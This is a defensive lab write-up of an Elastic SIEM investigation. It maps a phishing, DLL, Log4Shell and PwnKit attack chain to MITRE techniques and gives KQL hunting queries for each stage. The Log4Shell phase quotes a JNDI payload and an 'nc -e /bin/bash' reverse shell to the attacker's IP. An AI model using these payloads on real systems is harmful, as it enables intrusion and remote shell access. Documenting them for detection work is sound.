# Technical Write-up: ElasticCase Lab Analysis

## 🛡️ Executive Summary
During the investigation in **Elastic SIEM**, I identified a multi-stage attack involving phishing-based initial access,
malicious DLL execution, defense evasion, and cross-platform exploitation (**Log4Shell** & **PwnKit**).
The attacker successfully established remote access, executed reverse shells, and escalated privileges to root.

---

## 🔍 Investigation Phases

### Phase 1: Initial Access (Windows)
**MITRE ATT&CK:** [T1204.002](https://attack.mitre.org/techniques/T1204/002/) — User Execution: Malicious File

The user `ahmed` downloaded and executed a phishing payload disguised with a double extension to mimic a PDF document.

* **Hostname:** `DESKTOP-Q1SL9P2`
* **File Name:** `Acount_details.pdf.exe`
* **Attacker IP:** `192.168.1.10`

**KQL Hunting Query:**
```kql
file.name : "Acount_details.pdf.exe" or process.name : "Acount_details.pdf.exe"

```

---

### Phase 2: Execution & Privilege Escalation (Windows)

**MITRE ATT&CK:** [T1218.011](https://attack.mitre.org/techniques/T1218/011/) — Signed Binary Proxy Execution: Rundll32

A privileged user `cybery` executed a malicious DLL through a trusted Windows binary (`rundll32.exe`) to bypass security controls and spawn a shell.

* **Malicious DLL:** `mCblHDgWP.dll`
* **Parent Process:** `rundll32.exe`
* **Child Process:** `cmd.exe` (PID: 10716)

**KQL Hunting Query:**

```kql
process.parent.name : "rundll32.exe" and process.name : "cmd.exe"

```

---

### Phase 3: Defense Evasion

**MITRE ATT&CK:** [T1562](https://attack.mitre.org/techniques/T1562/) — Impair Defenses

The attacker modified sensitive registry keys to tamper with the system's cryptographic enforcement policy.

* **Target Key:** `HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled`

**KQL Hunting Query:**

```kql
registry.path : "*FipsAlgorithmPolicy\\Enabled"

```

---

### Phase 4: Linux Exploitation (Log4Shell RCE)

**MITRE ATT&CK:** [T1190](https://attack.mitre.org/techniques/T1190/) — Exploit Public-Facing Application

The attacker targeted a vulnerable **Apache Solr** instance using the **Log4Shell** vulnerability to achieve Remote Code Execution.

* **Vulnerable Path:** `/admin/cores`
* **JNDI Payload:** `${jndi:ldap://192.168.1.10:1389/Exploit}`
* **Reverse Shell:** `nc -e /bin/bash 192.168.1.10 9999`
* **Affected User:** `solr` (CentOS host)

**KQL Hunting Query:**

```kql
url.query : "*jndi*ldap*" or process.command_line : "*nc -e /bin/bash*"

```

---

### Phase 5: Root Escalation (PwnKit)

**MITRE ATT&CK:** [T1068](https://attack.mitre.org/techniques/T1068/) — Exploitation for Privilege Escalation

After gaining initial access to an Ubuntu host, the attacker exploited **CVE-2021-4034 (PwnKit)** to escalate privileges to root.

* **Exploit:** `CVE-2021-4034.py` (retrieved via `wget`)
* **Key Artifact:** Execution of `pkexec` binary.
* **MD5 Hash:** `3a4ad518e9e404a6bad3d39dfebaf2f6`
* **Result:** Interactive root shell (`bash -i`).

**KQL Hunting Query:**

```kql
process.command_line : "*CVE-2021-4034.py*" or (process.name : "pkexec" and process.args : "bash -i")

```
